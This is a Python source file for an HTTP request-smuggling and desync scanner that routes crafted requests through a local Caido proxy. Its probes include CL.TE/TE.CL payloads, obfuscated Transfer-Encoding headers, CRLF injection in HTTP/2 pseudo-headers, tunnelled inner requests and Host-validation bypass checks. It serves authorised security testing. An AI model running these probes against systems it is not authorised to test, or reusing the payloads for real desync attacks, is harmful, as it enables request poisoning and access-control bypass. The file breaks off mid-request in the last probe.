#!/usr/bin/env python3
"""HTTP request-smuggling / desync probe.

Covers Albinowax/PortSwigger research + related H2/H3 contamination work
ingested into wiki/techniques/server-side/. Single-endpoint, server-side
fingerprinting. Does NOT send actual smuggled application requests that
could poison shared connection pools and affect other users — every probe
either (a) only blocks/desyncs the attacker's own socket, or (b) measures
the difference between two probes on the attacker's own connections.

All traffic is routed through Caido (default `http://127.0.0.1:8080`) via
HTTP CONNECT (HTTPS targets) or absolute-URI forward proxying (HTTP
targets) so requests appear in the Caido sitemap for review.

Probes implemented:
  cl.te         classic CL.TE timing
  te.cl         classic TE.CL timing
  te.te         TE.TE obfuscated Transfer-Encoding header
  cl.0          CL>0 frontend, CL=0 backend ("browser-powered desync")
  0.cl          frontend treats as no body, backend reads CL bytes
  h2.cl         HTTP/2 → H1 downgrade with injected Content-Length
  h2.te         HTTP/2 → H1 downgrade with injected Transfer-Encoding
  h2.crlf       CRLF injection in H2 pseudo-headers (:path / :authority)
  h2.tunnel     full H1 request smuggled inside H2 body (tunneling)
  conn.state    connection-state per-first-request validation bypass
  hop.smuggle   hop-by-hop Connection: header drop
  expect.100    Expect: 100-continue desync
  h2c.upgrade   HTTP/1.1 → h2c Connection: Upgrade smuggling

Usage:
  python3 bin/smuggle_probe.py --target https://example.com/ [--probes all]
  python3 bin/smuggle_probe.py --target https://example.com/ \
      --probes cl.te,te.cl,h2.te --proxy http://127.0.0.1:8080 --json out.json
"""
from __future__ import annotations

import argparse
import json
import socket
import ssl
import sys
import time
from dataclasses import asdict, dataclass, field
from typing import Optional
from urllib.parse import urlparse

# ---------- defaults ----------
DEFAULT_PROXY = "http://127.0.0.1:8080"
DEFAULT_TIMEOUT = 10.0
BASELINE_SAMPLES = 3
DESYNC_TIMING_DELTA = 4.0  # seconds — vulnerable response hangs at least this much above baseline

# Probes whose payload includes an extra trailing fragment that the *backend*
# may interpret as the start of a follow-up request. Because the smuggled
# fragment is left dangling on the same socket (which we then close), no other
# user's request can be poisoned — only our own connection is desynced.
ALL_PROBES = [
    "cl.te",
    "te.cl",
    "te.te",
    "cl.0",
    "0.cl",
    "h2.cl",
    "h2.te",
    "h2.crlf",
    "h2.tunnel",
    "conn.state",
    "hop.smuggle",
    "expect.100",
    "h2c.upgrade",
]


# ---------- result type ----------
@dataclass
class ProbeResult:
    name: str
    verdict: str  # "vuln" | "safe" | "inconclusive" | "error"
    baseline_ms: Optional[float] = None
    probe_ms: Optional[float] = None
    delta_ms: Optional[float] = None
    status_baseline: Optional[int] = None
    status_probe: Optional[int] = None
    detail: str = ""
    raw: dict = field(default_factory=dict)


# ---------- Caido tunnel helpers ----------
def _connect_through_caido(target_host: str, target_port: int, proxy_url: str, timeout: float) -> socket.socket:
    """Open a raw TCP socket to target via Caido's HTTP CONNECT tunnel.

    Returned socket is plain TCP — caller wraps in TLS if target is HTTPS.
    """
    pu = urlparse(proxy_url)
    proxy_host, proxy_port = pu.hostname or "127.0.0.1", pu.port or 8080
    s = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
    s.settimeout(timeout)
    connect_req = (
        f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
        f"Host: {target_host}:{target_port}\r\n"
        f"User-Agent: tlx-smuggle-probe/1\r\n"
        f"Proxy-Connection: keep-alive\r\n\r\n"
    ).encode()
    s.sendall(connect_req)
    # Read the CONNECT response line + headers.
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = s.recv(4096)
        if not chunk:
            raise ConnectionError("Caido proxy closed during CONNECT handshake")
        buf += chunk
        if len(buf) > 65536:
            raise ConnectionError("Caido CONNECT response too large")
    status_line = buf.split(b"\r\n", 1)[0].decode("latin-1", errors="replace")
    if " 200 " not in status_line:
        raise ConnectionError(f"Caido CONNECT failed: {status_line}")
    return s


def _open_raw(target_url: str, proxy_url: str, timeout: float) -> tuple[socket.socket, str, int, str]:
    """Open a raw (TLS-wrapped if needed) socket to target via Caido proxy.

    Returns (sock, host, port, base_path).
    """
    u = urlparse(target_url)
    host = u.hostname or ""
    if not host:
        raise ValueError(f"target URL missing host: {target_url}")
    scheme = (u.scheme or "https").lower()
    port = u.port or (443 if scheme == "https" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    raw = _connect_through_caido(host, port, proxy_url, timeout)
    if scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE  # Caido may MITM; we don't pin
        ctx.set_alpn_protocols(["http/1.1"])
        sock = ctx.wrap_socket(raw, server_hostname=host)
    else:
        sock = raw
    sock.settimeout(timeout)
    return sock, host, port, path


# ---------- low-level recv ----------
def _recv_until_idle(sock: socket.socket, idle_window: float, max_total: float) -> bytes:
    """Read bytes until socket goes idle for idle_window or max_total elapsed.

    Used by timing probes — vulnerable servers hang waiting for more bytes;
    safe servers return their response promptly.
    """
    sock.settimeout(idle_window)
    deadline = time.monotonic() + max_total
    buf = b""
    while time.monotonic() < deadline:
        try:
            chunk = sock.recv(65536)
        except (socket.timeout, TimeoutError):
            return buf
        except OSError:
            return buf
        if not chunk:
            return buf
        buf += chunk
    return buf


def _parse_status(resp: bytes) -> Optional[int]:
    if not resp:
        return None
    try:
        first = resp.split(b"\r\n", 1)[0].decode("latin-1", errors="replace")
        parts = first.split(" ", 2)
        if len(parts) >= 2 and parts[0].upper().startswith("HTTP/"):
            return int(parts[1])
    except (ValueError, IndexError):
        return None
    return None


# ---------- H1 baseline timing ----------
def _send_h1(sock: socket.socket, payload: bytes, idle_window: float, max_total: float) -> tuple[bytes, float]:
    t0 = time.monotonic()
    sock.sendall(payload)
    resp = _recv_until_idle(sock, idle_window, max_total)
    return resp, (time.monotonic() - t0) * 1000.0


def _baseline_timing(target_url: str, proxy_url: str, timeout: float) -> tuple[float, Optional[int]]:
    """Measure baseline GET latency through Caido (median of N samples)."""
    samples: list[float] = []
    last_status: Optional[int] = None
    for _ in range(BASELINE_SAMPLES):
        try:
            sock, host, _port, path = _open_raw(target_url, proxy_url, timeout)
            req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: tlx-smuggle-probe/1\r\n"
                f"Connection: close\r\n\r\n"
            ).encode()
            resp, ms = _send_h1(sock, req, idle_window=1.5, max_total=timeout)
            samples.append(ms)
            last_status = _parse_status(resp)
            try:
                sock.close()
            except OSError:
                pass
        except (OSError, ConnectionError) as e:  # noqa: PERF203
            samples.append(timeout * 1000.0)
            _ = e
    samples.sort()
    return samples[len(samples) // 2], last_status


# ---------- probe implementations ----------
def probe_cl_te(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    """CL.TE: frontend reads CL bytes, backend honors TE: chunked.

    Body has TE-chunked terminator at byte 0 (`0\\r\\n\\r\\n`) plus 1 extra
    byte (`G`). Backend stops at chunked terminator, leaves `G` dangling on
    the socket. Vulnerable backend hangs waiting for the rest of the next
    request; safe backend treats CL as authoritative and returns promptly.
    """
    name = "cl.te"
    try:
        sock, host, _port, path = _open_raw(target_url, proxy_url, timeout)
    except (OSError, ConnectionError, ValueError) as e:
        return ProbeResult(name=name, verdict="error", detail=f"connect: {e}")
    body = b"0\r\n\r\nG"
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: tlx-smuggle-probe/1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n"
    ).encode() + body
    resp, ms = _send_h1(sock, req, idle_window=2.0, max_total=timeout)
    try:
        sock.close()
    except OSError:
        pass
    status = _parse_status(resp)
    delta = ms - baseline_ms
    if delta > DESYNC_TIMING_DELTA * 1000 and (status is None or status == 0):
        verdict = "vuln"
        detail = "backend hangs after chunked terminator — TE-honoring backend with CL-honoring frontend"
    elif status and 400 <= status < 500:
        verdict = "safe"
        detail = f"frontend rejected ambiguous CL+TE ({status})"
    else:
        verdict = "inconclusive"
        detail = f"status={status} delta_ms={delta:.0f}"
    return ProbeResult(name=name, verdict=verdict, baseline_ms=baseline_ms, probe_ms=ms, delta_ms=delta, status_probe=status, detail=detail)


def probe_te_cl(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    """TE.CL: frontend honors TE, backend honors CL.

    Body: small chunk + more data + chunked terminator. If frontend reads TE
    it consumes everything; if backend reads CL=4 it stops at the first chunk
    size line, leaving the rest dangling. Vulnerable → backend hang.
    """
    name = "te.cl"
    try:
        sock, host, _port, path = _open_raw(target_url, proxy_url, timeout)
    except (OSError, ConnectionError, ValueError) as e:
        return ProbeResult(name=name, verdict="error", detail=f"connect: {e}")
    smuggled = b"GPOST / HTTP/1.1\r\nFoo: bar"
    body = (
        b"5c\r\n"
        + smuggled
        + b"\r\n"
        + b"0\r\n\r\n"
    )
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: tlx-smuggle-probe/1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n"
    ).encode() + body
    resp, ms = _send_h1(sock, req, idle_window=2.0, max_total=timeout)
    try:
        sock.close()
    except OSError:
        pass
    status = _parse_status(resp)
    delta = ms - baseline_ms
    if delta > DESYNC_TIMING_DELTA * 1000:
        verdict = "vuln"
        detail = "backend hangs reading CL=4 — TE frontend / CL backend desync"
    elif status and 400 <= status < 500:
        verdict = "safe"
        detail = f"frontend rejected CL+TE ({status})"
    else:
        verdict = "inconclusive"
        detail = f"status={status} delta_ms={delta:.0f}"
    return ProbeResult(name=name, verdict=verdict, baseline_ms=baseline_ms, probe_ms=ms, delta_ms=delta, status_probe=status, detail=detail)


def probe_te_te(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    """TE.TE: both honor TE but disagree on which TE header to read.

    Sends two Transfer-Encoding headers: one normal, one obfuscated.
    Frontend honors first, backend honors second (or vice versa). Try four
    obfuscations and pick the most desync-suggestive one.
    """
    name = "te.te"
    obfuscations = [
        ("Transfer-Encoding", " chunked"),
        ("Transfer-Encoding ", "chunked"),  # trailing space in name
        ("Transfer-Encoding", "chunked\r\nX-Filler: 1"),
        ("Transfer-Encoding", "\tchunked"),
    ]
    best = ProbeResult(name=name, verdict="safe", baseline_ms=baseline_ms, detail="no obfuscation triggered desync")
    for hname, hval in obfuscations:
        try:
            sock, host, _port, path = _open_raw(target_url, proxy_url, timeout)
        except (OSError, ConnectionError, ValueError) as e:
            return ProbeResult(name=name, verdict="error", detail=f"connect: {e}")
        body = b"0\r\n\r\nG"
        req = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: tlx-smuggle-probe/1\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"{hname}: {hval}\r\n"
            f"Content-Length: {len(body)}\r\n\r\n"
        ).encode() + body
        resp, ms = _send_h1(sock, req, idle_window=2.0, max_total=timeout)
        try:
            sock.close()
        except OSError:
            pass
        status = _parse_status(resp)
        delta = ms - baseline_ms
        if delta > DESYNC_TIMING_DELTA * 1000:
            return ProbeResult(name=name, verdict="vuln", baseline_ms=baseline_ms, probe_ms=ms, delta_ms=delta, status_probe=status, detail=f"obfuscation {hname!r}={hval!r} → backend hang")
        if delta > (best.delta_ms or 0):
            best = ProbeResult(name=name, verdict="inconclusive", baseline_ms=baseline_ms, probe_ms=ms, delta_ms=delta, status_probe=status, detail=f"largest delta from {hname!r}={hval!r}")
    return best


def probe_cl_0(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    """CL.0 ("browser-powered desync"): frontend forwards CL>0, backend
    treats GET as bodyless. Trailing body bytes become a new request.

    We send a GET with Content-Length:6 and body `GHELLO`. Vulnerable
    backend reads first request as GET (no body), then sees `GHELLO` as a
    partial next request → hangs.
    """
    name = "cl.0"
    try:
        sock, host, _port, path = _open_raw(target_url, proxy_url, timeout)
    except (OSError, ConnectionError, ValueError) as e:
        return ProbeResult(name=name, verdict="error", detail=f"connect: {e}")
    body = b"GHELLO"
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: tlx-smuggle-probe/1\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode() + body
    resp, ms = _send_h1(sock, req, idle_window=2.0, max_total=timeout)
    try:
        sock.close()
    except OSError:
        pass
    status = _parse_status(resp)
    delta = ms - baseline_ms
    if delta > DESYNC_TIMING_DELTA * 1000:
        verdict = "vuln"
        detail = "GET with body causes backend hang — CL.0 desync"
    elif status and 200 <= status < 300 and delta < 1000:
        verdict = "safe"
        detail = f"server consumed body and answered ({status})"
    else:
        verdict = "inconclusive"
        detail = f"status={status} delta_ms={delta:.0f}"
    return ProbeResult(name=name, verdict=verdict, baseline_ms=baseline_ms, probe_ms=ms, delta_ms=delta, status_probe=status, detail=detail)


def probe_0_cl(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    """0.CL: frontend treats request as no body, backend reads CL bytes.

    POST with Content-Length:0 plus an extra trailing fragment. Frontend
    forwards 0 bytes (request "complete"); backend reads CL=N from a
    *different* CL source (e.g. a duplicate CL header). Detect by
    duplicating CL — vulnerable backends pick the larger one.
    """
    name = "0.cl"
    try:
        sock, host, _port, path = _open_raw(target_url, proxy_url, timeout)
    except (OSError, ConnectionError, ValueError) as e:
        return ProbeResult(name=name, verdict="error", detail=f"connect: {e}")
    body = b"GHACK"
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: tlx-smuggle-probe/1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 0\r\n"
        f"Content-Length: {len(body)}\r\n\r\n"
    ).encode() + body
    resp, ms = _send_h1(sock, req, idle_window=2.0, max_total=timeout)
    try:
        sock.close()
    except OSError:
        pass
    status = _parse_status(resp)
    delta = ms - baseline_ms
    if status and 400 <= status < 500 and b"duplicate" in resp.lower():
        verdict = "safe"
        detail = "frontend rejected duplicate Content-Length"
    elif delta > DESYNC_TIMING_DELTA * 1000:
        verdict = "vuln"
        detail = "duplicate CL accepted; backend desync detected"
    elif status and 200 <= status < 400:
        verdict = "inconclusive"
        detail = f"duplicate CL accepted, no desync timing ({status})"
    else:
        verdict = "inconclusive"
        detail = f"status={status} delta_ms={delta:.0f}"
    return ProbeResult(name=name, verdict=verdict, baseline_ms=baseline_ms, probe_ms=ms, delta_ms=delta, status_probe=status, detail=detail)


# ---------- HTTP/2 probes via httpx ----------
def _httpx_h2_client(proxy_url: str, timeout: float):
    try:
        import httpx  # type: ignore
    except ImportError as e:
        raise RuntimeError("httpx required for H2 probes — `pip install httpx[http2]`") from e
    return httpx.Client(
        http2=True,
        verify=False,
        timeout=timeout,
        proxy=proxy_url,
        follow_redirects=False,
    )


def probe_h2_cl(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    name = "h2.cl"
    try:
        client = _httpx_h2_client(proxy_url, timeout)
    except RuntimeError as e:
        return ProbeResult(name=name, verdict="error", detail=str(e))
    try:
        t0 = time.monotonic()
        body = b"GHELLO"
        r = client.request(
            "POST", target_url,
            headers={
                "user-agent": "tlx-smuggle-probe/1",
                "content-type": "application/x-www-form-urlencoded",
                "content-length": "0",  # inject forbidden CL into H2 (RFC says backend must reject; many don't)
            },
            content=body,
        )
        ms = (time.monotonic() - t0) * 1000.0
        delta = ms - baseline_ms
        if r.status_code in (400, 421, 502, 504) and delta > DESYNC_TIMING_DELTA * 1000:
            verdict = "vuln"
            detail = f"H2→H1 with conflicting CL caused {r.status_code} after long wait — likely downgrade desync"
        elif r.status_code == 400:
            verdict = "safe"
            detail = f"H2 layer rejected CL header ({r.status_code})"
        elif delta > DESYNC_TIMING_DELTA * 1000:
            verdict = "vuln"
            detail = f"H2.CL caused backend hang ({delta:.0f}ms vs baseline {baseline_ms:.0f}ms)"
        else:
            verdict = "inconclusive"
            detail = f"status={r.status_code} delta_ms={delta:.0f}"
        return ProbeResult(name=name, verdict=verdict, baseline_ms=baseline_ms, probe_ms=ms, delta_ms=delta, status_probe=r.status_code, detail=detail, raw={"http_version": r.http_version})
    except Exception as e:  # noqa: BLE001
        return ProbeResult(name=name, verdict="error", detail=f"{type(e).__name__}: {e}")
    finally:
        client.close()


def probe_h2_te(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    name = "h2.te"
    try:
        client = _httpx_h2_client(proxy_url, timeout)
    except RuntimeError as e:
        return ProbeResult(name=name, verdict="error", detail=str(e))
    try:
        t0 = time.monotonic()
        body = b"0\r\n\r\nG"
        r = client.request(
            "POST", target_url,
            headers={
                "user-agent": "tlx-smuggle-probe/1",
                "content-type": "application/x-www-form-urlencoded",
                "transfer-encoding": "chunked",  # RFC forbids in H2; vulnerable downgraders forward it
            },
            content=body,
        )
        ms = (time.monotonic() - t0) * 1000.0
        delta = ms - baseline_ms
        if r.status_code == 400 and "transfer-encoding" in (r.text or "").lower():
            verdict = "safe"
            detail = "H2 layer rejected forbidden Transfer-Encoding header"
        elif delta > DESYNC_TIMING_DELTA * 1000:
            verdict = "vuln"
            detail = f"H2.TE caused backend hang ({delta:.0f}ms vs baseline {baseline_ms:.0f}ms) — downgrade desync"
        elif r.status_code in (502, 504):
            verdict = "vuln"
            detail = f"H2.TE produced {r.status_code} — backend chunked-parsing disagreement"
        else:
            verdict = "inconclusive"
            detail = f"status={r.status_code} delta_ms={delta:.0f}"
        return ProbeResult(name=name, verdict=verdict, baseline_ms=baseline_ms, probe_ms=ms, delta_ms=delta, status_probe=r.status_code, detail=detail, raw={"http_version": r.http_version})
    except Exception as e:  # noqa: BLE001
        return ProbeResult(name=name, verdict="error", detail=f"{type(e).__name__}: {e}")
    finally:
        client.close()


def probe_h2_crlf(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    """CRLF injection in H2 :path / :authority pseudo-headers.

    Some proxies emit pseudo-header values verbatim into the downgraded H1
    request line / Host header, allowing header injection or full request
    smuggling. Detect by sending `:authority: host\\r\\nX-Echo-Inject: 1`
    via custom h2 frame — fall back to httpx with raw header monkey-patch.
    Caveat: httpx normalizes; use lower-level h2 + hyperframe when available.
    """
    name = "h2.crlf"
    try:
        import h2.connection  # type: ignore
        import h2.config  # type: ignore
        import hyperframe.frame  # type: ignore  # noqa: F401
    except ImportError:
        return ProbeResult(name=name, verdict="error", detail="install `h2 hyperframe` for CRLF pseudo-header probe")
    try:
        u = urlparse(target_url)
        host = u.hostname or ""
        port = u.port or (443 if u.scheme == "https" else 80)
        path = u.path or "/"
        raw = _connect_through_caido(host, port, proxy_url, timeout)
        if u.scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])
            sock = ctx.wrap_socket(raw, server_hostname=host)
            negotiated = sock.selected_alpn_protocol()
            if negotiated != "h2":
                try:
                    sock.close()
                except OSError:
                    pass
                return ProbeResult(name=name, verdict="error", detail=f"target negotiated {negotiated!r} not h2 — no downgrade path to test")
        else:
            sock = raw
        sock.settimeout(timeout)
        cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
        conn = h2.connection.H2Connection(config=cfg)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())
        # Send headers WITH CRLF injection in :authority.
        injected_authority = f"{host}\r\nX-Echo-Inject: tlx-smuggle"
        try:
            conn.send_headers(
                1,
                [
                    (":method", "GET"),
                    (":authority", injected_authority),
                    (":scheme", u.scheme or "https"),
                    (":path", path),
                    ("user-agent", "tlx-smuggle-probe/1"),
                ],
                end_stream=True,
            )
        except Exception as e:  # noqa: BLE001
            try:
                sock.close()
            except OSError:
                pass
            return ProbeResult(name=name, verdict="safe", detail=f"h2 client refused CRLF in pseudo-header: {e} — client-side enforced")
        sock.sendall(conn.data_to_send())
        t0 = time.monotonic()
        # Read frames until response complete or timeout.
        status_code = None
        headers_seen: list = []
        buf = b""
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                chunk = sock.recv(65536)
            except (socket.timeout, TimeoutError, OSError):
                break
            if not chunk:
                break
            buf += chunk
            events = conn.receive_data(chunk)
            done = False
            for ev in events:
                if hasattr(ev, "headers"):
                    headers_seen = ev.headers
                    for k, v in ev.headers:
                        kk = k if isinstance(k, str) else k.decode("latin-1", errors="replace")
                        vv = v if isinstance(v, str) else v.decode("latin-1", errors="replace")
                        if kk == ":status":
                            try:
                                status_code = int(vv)
                            except ValueError:
                                status_code = None
                if hasattr(ev, "stream_ended") and ev.stream_ended:
                    done = True
            sock.sendall(conn.data_to_send())
            if done:
                break
        ms = (time.monotonic() - t0) * 1000.0
        try:
            sock.close()
        except OSError:
            pass
        echo = any("x-echo-inject" in (str(k).lower()) for k, _ in headers_seen)
        delta = ms - baseline_ms
        if status_code == 400 and not echo:
            verdict = "safe"
            detail = "proxy rejected CRLF in :authority"
        elif echo:
            verdict = "vuln"
            detail = "injected header echoed back — pseudo-header CRLF leaked into H1"
        elif delta > DESYNC_TIMING_DELTA * 1000:
            verdict = "vuln"
            detail = f"backend hang on CRLF :authority ({delta:.0f}ms vs baseline {baseline_ms:.0f}ms)"
        else:
            verdict = "inconclusive"
            detail = f"status={status_code} delta_ms={delta:.0f} no echo"
        return ProbeResult(name=name, verdict=verdict, baseline_ms=baseline_ms, probe_ms=ms, delta_ms=delta, status_probe=status_code, detail=detail)
    except (OSError, ConnectionError, ValueError) as e:
        return ProbeResult(name=name, verdict="error", detail=f"{type(e).__name__}: {e}")


def probe_h2_tunnel(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    """H2 request tunneling: H2 body contains a complete H1 request.

    Server-side detection: send H2 POST with body that LOOKS LIKE an H1
    request (`GET /robots.txt HTTP/1.1\\r\\nHost: ...\\r\\n\\r\\n`). If the
    backend tunnels, we may see two responses or the response body of an
    unintended target. Safer detection (here): observe timing + whether
    response body contains content unrelated to the original path.
    """
    name = "h2.tunnel"
    try:
        client = _httpx_h2_client(proxy_url, timeout)
    except RuntimeError as e:
        return ProbeResult(name=name, verdict="error", detail=str(e))
    try:
        u = urlparse(target_url)
        inner = (
            f"GET /robots.txt HTTP/1.1\r\n"
            f"Host: {u.hostname}\r\n"
            f"User-Agent: tlx-smuggle-probe-inner/1\r\n\r\n"
        ).encode()
        t0 = time.monotonic()
        r = client.request(
            "POST", target_url,
            headers={
                "user-agent": "tlx-smuggle-probe/1",
                "content-type": "application/x-www-form-urlencoded",
            },
            content=inner,
        )
        ms = (time.monotonic() - t0) * 1000.0
        delta = ms - baseline_ms
        body = r.text or ""
        # Heuristic: if response body contains robots.txt-like content, the
        # backend processed the inner request.
        tunnel_hit = ("user-agent" in body.lower() and "disallow" in body.lower()) or ("sitemap" in body.lower() and "robots" in (u.path or "").lower() is False)
        if tunnel_hit:
            verdict = "vuln"
            detail = "response body resembles /robots.txt — inner H1 request likely processed (tunneling)"
        elif delta > DESYNC_TIMING_DELTA * 1000:
            verdict = "vuln"
            detail = f"backend hang after H2 body containing H1 request ({delta:.0f}ms)"
        elif r.status_code in (400, 413, 414):
            verdict = "safe"
            detail = f"frontend rejected suspicious body ({r.status_code})"
        else:
            verdict = "inconclusive"
            detail = f"status={r.status_code} delta_ms={delta:.0f}"
        return ProbeResult(name=name, verdict=verdict, baseline_ms=baseline_ms, probe_ms=ms, delta_ms=delta, status_probe=r.status_code, detail=detail, raw={"http_version": r.http_version})
    except Exception as e:  # noqa: BLE001
        return ProbeResult(name=name, verdict="error", detail=f"{type(e).__name__}: {e}")
    finally:
        client.close()


def probe_conn_state(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    """Connection-state smuggling: send a benign precursor, then a malformed
    request on the *same* keep-alive connection. If the server only
    validates per-connection (e.g. Host whitelist on first request only),
    the second request bypasses the check.

    We can't exploit application-level Host bypass without knowing internal
    names — so we surface the *primitive*: does the server reuse this
    connection AND does it apply different validation to the second request?

    Heuristic: precursor with valid Host yields 2xx; second request on same
    socket with bogus `Host: x.invalid` should yield 4xx if validation is
    per-request. If second request succeeds with 2xx (and length similar to
    precursor's), per-connection validation is in effect → vulnerable.
    """
    name = "conn.state"
    try:
        sock, host, _port, path = _open_raw(target_url, proxy_url, timeout)
    except (OSError, ConnectionError, ValueError) as e:
        return ProbeResult(name=name, verdict="error", detail=f"connect: {e}")
    precursor = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: tlx-smuggle-probe/1\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()
    sock.sendall(precursor)
    resp1 = _recv_until_idle(sock, 1.5, timeout / 2)
    status1 = _parse_status(resp1)
    second = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: x.invalid.tlx-smuggle-probe\r\n"
        f"User-Agent: tlx-smuggle-probe/1\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    try:
        sock.sendall(second)
    except OSError:
        return ProbeResult(name=name, verdict="safe", baseline_ms=baseline_ms, status_baseline=status1, detail="server closed connection after precursor — no keep-alive")
    resp2 = _recv_until_idle(sock, 2.0, timeout)
    try:
        sock.close()
    except OSError:
        pass
    status2 = _parse_status(resp2)
    if status1 is None and status2 is None:
        verdict = "error"
        detail = "no responses received"
    elif status2 is None:
        verdict = "safe"
        detail = f"server closed connection on bogus Host (status1={status1})"
    elif 200 <= status2 < 400 and 200 <= (status1 or 0) < 400:
        verdict = "vuln"
        detail = f"bogus Host accepted on reused connection ({status1} then {status2}) — per-connection validation only"
    elif 400 <= status2 < 500:
        verdict = "safe"
        detail = f"per-request Host validation enforced ({status1} then {status2})"
    else:
        verdict = "inconclusive"
        detail = f"status1={status1} status2={status2}"
    return ProbeResult(name=name, verdict=verdict, baseline_ms=baseline_ms, status_baseline=status1, status_probe=status2, detail=detail)


def probe_hop_smuggle(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    """Hop-by-hop smuggling: name a sensitive header in Connection: so the
    proxy strips it, while the backend (or vice versa) sees it absent.

    Detect by sending `Connection: X-Echo-Header` and `X-Echo-Header: 1`.
    If the response somehow proves the header reached the backend OR was
    stripped where it shouldn't be, we flag it. As a passive detector we
    just measure whether the server tolerates listing arbitrary names in
    Connection: without 400 — many proxies do, leaving them open to this.
    """
    name = "hop.smuggle"
    try:
        sock, host, _port, path = _open_raw(target_url, proxy_url, timeout)
    except (OSError, ConnectionError, ValueError) as e:
        return ProbeResult(name=name, verdict="error", detail=f"connect: {e}")
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: tlx-smuggle-probe/1\r\n"
        f"Connection: close, X-Forwarded-For\r\n"
        f"X-Forwarded-For: 127.0.0.1\r\n\r\n"
    ).encode()
    resp, ms = _send_h1(sock, req, idle_window=1.5, max_total=timeout)
    try:
        sock.close()
    except OSError:
        pass
    status = _parse_status(resp)
    if status and 200 <= status < 400:
        verdict = "inconclusive"
        detail = f"server accepted Connection: with X-Forwarded-For listed ({status}) — hop-by-hop smuggling primitive likely available; needs differential probe per app feature"
    elif status and 400 <= status < 500:
        verdict = "safe"
        detail = f"server rejected hop-by-hop manipulation ({status})"
    else:
        verdict = "inconclusive"
        detail = f"status={status}"
    return ProbeResult(name=name, verdict=verdict, baseline_ms=baseline_ms, probe_ms=ms, status_probe=status, detail=detail)


def probe_expect_100(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    """Expect: 100-continue desync. Send POST with Expect header and a CL
    body; some proxies forward without waiting for 100, then mishandle the
    body framing.
    """
    name = "expect.100"
    try:
        sock, host, _port, path = _open_raw(target_url, proxy_url, timeout)
    except (OSError, ConnectionError, ValueError) as e:
        return ProbeResult(name=name, verdict="error", detail=f"connect: {e}")
    body = b"GHELLO"
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: tlx-smuggle-probe/1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Expect: 100-continue\r\n\r\n"
    ).encode() + body
    resp, ms = _send_h1(sock, req, idle_window=2.0, max_total=timeout)
    try:
        sock.close()
    except OSError:
        pass
    status = _parse_status(resp)
    delta = ms - baseline_ms
    interim = b"100 Continue" in resp
    if interim and status and 200 <= status < 400:
        verdict = "safe"
        detail = "proper 100 Continue then final response"
    elif delta > DESYNC_TIMING_DELTA * 1000:
        verdict = "vuln"
        detail = f"Expect+CL caused backend hang ({delta:.0f}ms)"
    elif status and 400 <= status < 500:
        verdict = "safe"
        detail = f"server rejected ({status})"
    else:
        verdict = "inconclusive"
        detail = f"status={status} interim={interim} delta_ms={delta:.0f}"
    return ProbeResult(name=name, verdict=verdict, baseline_ms=baseline_ms, probe_ms=ms, delta_ms=delta, status_probe=status, detail=detail)


def probe_h2c_upgrade(target_url: str, proxy_url: str, timeout: float, baseline_ms: float) -> ProbeResult:
    """h2c upgrade smuggling. Send `Upgrade: h2c` + `Connection: Upgrade,
    HTTP2-Settings` to an HTTPS endpoint; if backend honors h2c on a
    non-TLS hop the proxy stripped Upgrade but backend speaks h2c, we get
    a 101 or a binary H2 frame back.
    """
    name = "h2c.upgrade"
    try:
        sock, host, _port, path = _open_raw(target_url, proxy_url, timeout)
    except (OSError, ConnectionError, ValueError) as e:
        return ProbeResult(name=name, verdict="error", detail=f"connect: {e}")
    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
